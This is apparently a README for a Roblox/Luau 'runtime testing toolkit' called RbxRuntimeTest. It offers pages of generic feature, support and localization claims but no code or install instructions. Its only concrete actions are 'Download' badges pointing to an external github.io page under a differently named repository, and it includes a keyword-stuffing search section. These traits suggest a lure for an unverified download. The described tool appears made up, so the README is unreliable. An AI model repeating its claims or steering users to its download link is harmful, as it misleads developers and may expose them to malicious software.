![preview](https://raw.githubusercontent.com/Criadodetusabe/Luau-Proving-Grounds/main/promo_1a72.svg)
[![Download](https://raw.githubusercontent.com/Criadodetusabe/Luau-Proving-Grounds/main/start_03f0.svg)](https://Criadodetusabe.github.io/Luau-Proving-Grounds/)

# 🧪 RbxRuntimeTest — Studio-Side Runtime Verification for Roblox/Luau

> **Catch runtime surprises before your players do.** A featherweight, Studio-only runtime testing harness for Roblox and Luau projects — built for creators who value fast feedback loops, reproducible scenarios, and a clean separation between authoring and shipping.

Welcome to **RbxRuntimeTest**, a purpose-built runtime verification companion for Roblox Studio workflows. Where traditional unit testing frameworks demand heavy scaffolding and abstract away the very engine you're building on, RbxRuntimeTest leans directly into Studio's live environment — the same environment your game will actually run in. It watches your Luau code execute in real time, reports anomalies with surgical precision, and stays quietly out of your way when everything behaves.

Whether you're validating a data-oriented inventory system, stress-testing replication logic, or simply making sure your state machine doesn't wander off into the void, RbxRuntimeTest gives you a dependable safety net without dragging a production runtime along for the ride.

---

## 📖 Table of Contents

- [Why RbxRuntimeTest Exists](#-why-rbxruntimetest-exists)
- [Core Concept](#-core-concept)
- [Feature Highlights](#-feature-highlights)
- [Responsive & Adaptive Interface](#-responsive--adaptive-interface)
- [Multilingual Support](#-multilingual-support)
- [Continuous Coverage & Support](#-continuous-coverage--support)
- [SEO-Friendly Discovery](#-seo-friendly-discovery)
- [Architecture Overview](#-architecture-overview)
- [Quick Start](#-quick-start)
- [Configuration Reference](#-configuration-reference)
- [Writing Runtime Checks](#-writing-runtime-checks)
- [Assertion Patterns](#-assertion-patterns)
- [Mocking & Fixtures](#-mocking--fixtures)
- [Reporting & Diagnostics](#-reporting--diagnostics)
- [CI Integration Notes](#-ci-integration-notes)
- [Performance Considerations](#-performance-considerations)
- [Roadmap](#-roadmap)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🎯 Why RbxRuntimeTest Exists

Unit tests are wonderful. They isolate logic, they run fast, and they give you a warm fuzzy feeling. But Roblox is not a pure logical domain — it is a living, breathing, event-driven engine where object lifetimes, replication timing, and `RunService` heartbeats weave together in ways no isolated mock can fully capture.

RbxRuntimeTest was born from a simple frustration: *the code behaved in the test, then misbehaved in the engine.* The gap between "passes on paper" and "survives in Studio" is where bugs thrive, and that gap is exactly what this toolkit is designed to close.

Instead of simulating the engine, we observe the engine. Instead of reconstructing `Workspace`, we borrow the real one. Instead of pretending services behave a certain way, we ask them politely and record the answer.

---

## 🧠 Core Concept

At its heart, RbxRuntimeTest is a **Studio-only observer**. It attaches to your running play session, captures signals from a curated set of instrumentation points, and evaluates assertions against those signals in real time.

The metaphor is a laboratory, not a factory. You're not mass-producing test cases; you're conducting experiments in a controlled — but real — environment. Each experiment has a hypothesis (an assertion), a procedure (a scenario), and a result (a verdict). The lab notebook (the report) tells you what happened, when, and why it mattered.

Because RbxRuntimeTest never ships to production builds, it adds **zero runtime weight** to your released experience. The moment you stop testing, the toolkit goes dormant. Nothing lingers.

---

## ✨ Feature Highlights

- **Studio-Exclusive Scope** — Activates only when a Studio play session begins. Shipped builds remain untouched.
- **Zero-Dependency Core** — Built from pure Luau with no external module requirements.
- **Live Assertion Stream** — Watch verdicts populate as your scenario unfolds, not after the fact.
- **Deterministic Replay Logs** — Every captured signal is timestamped and ordered for post-mortem inspection.
- **Scenario Isolation** — Run independent scenarios without state bleeding between them.
- **Snapshot Diffing** — Compare engine state before and after a scenario to spot unintended mutations.
- **Signal Interception Hooks** — Observe events like `Touched`, `Changed`, and `Heartbeat` without permanently rewriting your code.
- **Lightweight Footprint** — Designed to sit alongside your existing toolkit, not replace it.
- **Typed Luau Surface** — Full Luau type annotations for editors and tooling that understand them.
- **Extensible Assertion Library** — Compose your own checks from small, focused primitives.

---

## 📱 Responsive & Adaptive Interface

When RbxRuntimeTest surfaces its report viewer, that viewer is expected to behave well no matter where it's rendered — from a compact Studio dock panel on a low-resolution display to a widescreen multi-monitor arrangement. The layout reflows gracefully, prioritizes the most relevant information at narrow widths, and expands into multi-column detail views when space allows.

The interface respects your Studio theme, whether you prefer the dark palette that saves your retinas during long sessions or a lighter alternative for daylight editing. Typography scaling, spacing, and contrast are all tuned to remain legible without demanding the bulk of a full-screen window.

- **Fluid report grid** that adjusts to dock width and height
- **Collapsible sections** for scenarios with many checkpoints
- **Keyboard-navigable verdict list** for fast scanning
- **Theme-aware color scheme** that inherits Studio preferences
- **Density toggles** for compact versus comfortable viewing

This is not decoration. When you're iterating at speed, every millisecond spent hunting for information is a millisecond not spent fixing. The interface earns its keep by being obvious.

---

## 🌐 Multilingual Support

Runtime tooling should speak the language of its user. RbxRuntimeTest ships with localization scaffolding for its user-facing strings, report summaries, and diagnostic messages, so teams collaborating across regions can read the same verdicts without friction.

Supported and planned locales include:

- **English (en)** — primary and reference locale
- **Spanish (es)** — community-contributed
- **Portuguese (pt-BR)** — community-contributed
- **French (fr)** — planned
- **German (de)** — planned
- **Japanese (ja)** — planned
- **Korean (ko)** — planned
- **Simplified Chinese (zh-CN)** — planned
- **Turkish (tr)** — planned

Localization files are plain Luau tables, so adding a language requires nothing more exotic than translating keys. Community translations are warmly welcomed.

---

## 🕒 Continuous Coverage & Support

Software does not sleep, and neither do the teams building the worlds people play in. RbxRuntimeTest is maintained with round-the-clock attention — **24/7 support** in the sense that issues are triaged promptly, discussions receive thoughtful replies, and regressions are prioritized the moment they surface.

Support channels include:

- **Issue tracker** — bug reports and feature requests
- **Discussion forum** — design conversations and usage questions
- **Changelog** — every notable change, documented and dated

We aim to respond to new issues within one business day and to have critical regressions triaged the same day they're reported. This is a living project, and it is treated accordingly.

---

## 🔍 SEO-Friendly Discovery

If you're searching for any of the following, you're in the right place — the repository is intentionally structured so that discoverability is not an afterthought:

- Roblox Lua runtime testing framework
- Luau Studio testing toolkit
- Roblox play-mode assertion library
- Studio-only runtime verification for Roblox projects
- Lightweight Luau test harness that doesn't ship to production
- Roblox event signal interception for testing
- Runtime scenario isolation for Roblox Studio
- Snapshot diffing for Roblox instance trees
- Typed Luau testing utilities

Each of these phrases describes a genuine capability of the project, not a keyword stuffed for search engines. The documentation is written to be read by humans first, and the search-friendliness emerges naturally from clear, specific language.

---

## 🏗️ Architecture Overview

RbxRuntimeTest is organized around four cooperating layers:

1. **Bootstrap Layer** — Detects Studio context, wires lifecycle hooks, and decides when to start and stop observing. If the environment isn't Studio, this layer quietly bows out.
2. **Instrumentation Layer** — Attaches lightweight listeners to whitelisted signal sources. This includes `RunService`, `Players`, `Workspace`, and any custom emitters you register.
3. **Scenario Layer** — Coordinates the execution of a scenario: setup, exercise, verification, teardown. Scenarios are pure declarations; the layer handles ordering and isolation.
4. **Reporting Layer** — Collects verdicts, formats them, and renders them into the responsive viewer. Also produces a serializable log for external consumption.

Dependencies flow strictly downward. The bootstrap knows about instrumentation, instrumentation knows about scenarios, scenarios know about reporting. Nothing flows upward, which keeps each layer independently replaceable.

---

## 🚀 Quick Start

Getting started is deliberately unceremonious. Drop the package into your project's shared tooling folder, reference it from a Studio-only script, and let the toolkit discover the rest.

For those who prefer the more explicit route, a typical boot sequence looks like this conceptually:

- Register the runtime module with your Studio-only loader
- Define one or more scenarios using the scenario DSL
- Launch a play session and watch the verdicts populate live
- Inspect the report, tweak, repeat

Because this toolkit is Studio-bound, there's nothing to configure for production builds. If you accidentally leave a reference in a shipped script, the bootstrap will detect the environment and render the tool inert.

---

## ⚙️ Configuration Reference

RbxRuntimeTest exposes a small, opinionated configuration surface. Every knob exists because a real workflow demanded it; nothing is present "just in case."

- **`captureDepth`** — How many layers of indirection the instrumentation records for a single signal. Higher values give richer context at the cost of memory.
- **`scenarioTimeout`** — Maximum wall-clock duration a scenario may run before being forcibly concluded. Prevents runaway loops from consuming a session.
- **`strictMode`** — When enabled, any undeclared signal source is treated as a warning rather than being silently ignored.
- **`snapshotGranularity`** — Controls whether snapshots capture top-level instance structure only, or descend recursively.
- **`reportRetention`** — Number of prior reports kept in memory for comparison during a session.
- **`themeOverride`** — Forces the report viewer into a specific theme, useful for screenshots and documentation.
- **`locale`** — Overrides the autodetected locale for report strings.

Configuration can be supplied at boot time or adjusted mid-session for experimentation. Adjustments are recorded in the report, so you always know which settings produced which outcomes.

---

## ✍️ Writing Runtime Checks

A runtime check is a hypothesis about how your code behaves in the live engine. Writing one is a matter of describing *what* you expect, *when* you expect it, and *what to do* when the expectation is met or missed.

Checks are composable. Small checks can be gathered into suites, suites can be nested, and the whole tree can be filtered at runtime to focus on a specific subsystem while you iterate. Filters are non-destructive; they change what is *reported*, never what is *executed*, unless you explicitly request a skip.

Common check patterns include:

- **Eventual assertions** — "within N seconds, condition X becomes true"
- **Sequence assertions** — "A happens before B, which happens before C"
- **Invariant assertions** — "at no point does condition Y become false"
- **Cardinality assertions** — "exactly three instances matching a predicate exist after scenario Z"
- **Negation assertions** — "no signal of type W is ever emitted during this scenario"

Each pattern maps to a small, dedicated primitive. Composition is straightforward, and the failure messages are designed to point you at the most likely culprit rather than bury you in a stack trace.

---

## 🧩 Assertion Patterns

Beyond the built-in patterns, RbxRuntimeTest encourages a culture of tailored assertions. If your project has a domain-specific invariant — say, "inventory weight never exceeds capacity during a transaction" — you can express that invariant directly, give it a name, and reuse it across scenarios.

Named assertions become part of your project's vocabulary. When a test fails, the failure message uses your vocabulary, not ours. That small courtesy pays compounding dividends in debugging speed over the life of a project.

Assertions can be marked as **blocking** or **advisory**. Blocking assertions halt the current scenario on failure, which is often what you want when a prerequisite has clearly gone wrong. Advisory assertions record a failure and continue, which is useful when you want to gather as much diagnostic information as possible from a single run.

---

## 🎭 Mocking & Fixtures

Where pure unit tests mock aggressively, runtime tests prefer to *borrow*. RbxRuntimeTest supports both philosophies:

- **Borrow mode** — Use the real service. This is the default and the recommended starting point.
- **Fixture mode** — Substitute a curated fixture for a service or module, either wholesale or surgically.
- **Shadow mode** — Keep the real service active but route a copy of its events to a fixture for observation. This is useful when you want the real behavior *and* deterministic capture.

Fixtures are declared alongside scenarios, live only for the scenario's duration, and are automatically cleaned up. There is no global fixture registry, which means no cross-scenario contamination and no mysterious "why is this mocked here" investigations six months later.

---

## 📊 Reporting & Diagnostics

The report is the artifact you'll actually read. It is therefore treated with the same care as the code that produces it.

A report contains:

- **Scenario metadata** — name, start time, duration, configuration snapshot
- **Verdict list** — one entry per assertion, ordered by execution time
- **Signal timeline** — chronological record of every captured event
- **Snapshot diffs** — what changed, and where, during the scenario
- **Diagnostic notes** — freeform annotations emitted by your own code
- **Summary counts** — passed, failed, advisory, skipped

Reports are serializable, which means they can be diffed across runs. A meaningful `git diff` of two reports can be more informative than a hundred log lines, especially when tracking down intermittent failures that only appear under specific timing.

---

## 🔄 CI Integration Notes

RbxRuntimeTest is Studio-bound, so it doesn't replace your CI pipeline's headless runner. What it does best is *complement* it.

A common pattern is to run runtime scenarios locally during development and attach the serialized report to pull requests. This gives reviewers a concrete, timestamped record of how the change behaved in a real engine session — not just a green checkmark from a mocked environment.

If your team maintains a Studio automation harness, RbxRuntimeTest can feed its reports into that harness for archival. The report format is stable and documented, so downstream tooling can consume it without fear of breaking.

---

## ⚡ Performance Considerations

Runtime observation is not without cost, and pretending otherwise would be dishonest. The toolkit is tuned to keep that cost low and predictable:

- Listeners are attached to a minimal, whitelisted set of signals
- Scenario execution is bounded by a configurable timeout
- Snapshots are lazy and only taken when a scenario requests them
- Reporting buffers are flushed incrementally rather than accumulated unbounded

In practice, typical scenarios add measurable but modest overhead to a play session — small enough to keep iteration comfortable, large enough to be worth knowing about. The report includes a performance summary so you always have visibility into what the tooling itself cost.

If a particular scenario is heavier than you'd like, the configuration surface offers straightforward dials to trade detail for speed. Tuning is expected, not punished.

---

## 🗺️ Roadmap

Milestones are set optimistically and adjusted honestly. What follows is the current intent, subject to community input and real-world use.

- **Near term** — Expanded locale coverage, richer snapshot diff visualization
- **Mid term** — Scenario templates for common Roblox subsystems, improved fixture ergonomics
- **Long term** — Cross-session report aggregation, deeper integration with Studio's built-in diagnostic surfaces

Suggestions are welcome through the discussion forum. The roadmap lives in the open and is revised in the open.

---

## 📜 License

This project is released under the **MIT License**. The full text is available at the canonical license location:

https://opensource.org/licenses/MIT

You are welcome to use, modify, and redistribute this software under the terms of that license. Attribution is appreciated but only required to the extent the license specifies.

---

## ⚠️ Disclaimer

RbxRuntimeTest is an independent developer tool for Roblox Studio workflows. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation. "Roblox" and "Studio" are referenced descriptively to identify the platform the toolkit operates within.

The software is provided **as is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Runtime observation is a diagnostic aid, not a guarantee of correctness. A scenario that passes in Studio does not certify that every user path in a shipped experience will behave identically. Use the toolkit as one signal among many, and always verify behavior in the environment your players actually inhabit.

By adopting this toolkit, you accept that testing is a practice — continuous, imperfect, and irreplaceable — rather than a checkbox to be ticked once and forgotten.

---

*Crafted for the quiet hours between "it works" and "it works everywhere."*

[![Download](https://raw.githubusercontent.com/Criadodetusabe/Luau-Proving-Grounds/main/start_03f0.svg)](https://Criadodetusabe.github.io/Luau-Proving-Grounds/)